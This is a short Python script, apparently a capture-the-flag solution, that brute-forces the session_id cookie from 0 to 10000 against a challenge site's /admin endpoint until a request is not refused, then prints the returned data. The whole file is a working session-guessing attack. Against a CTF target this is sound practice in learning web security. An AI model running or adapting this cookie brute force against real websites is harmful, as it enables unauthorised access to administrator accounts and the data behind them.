#!/usr//bin/env python3

from pwn import *
import requests

# make the request url
url = 'http://too-small-reminder.challs.olicyber.it/admin' 
s = requests.Session()

for i in range (10001):
    print(f"Attempt no. {i+1}")
    cookie = {'session_id': f'{i}'}
    r = s.get(url, cookies = cookie)
    if r.status_code != 403:
        try:    
            data = r.json()
            print(data)
            break
        except:
            print("Not the admin")


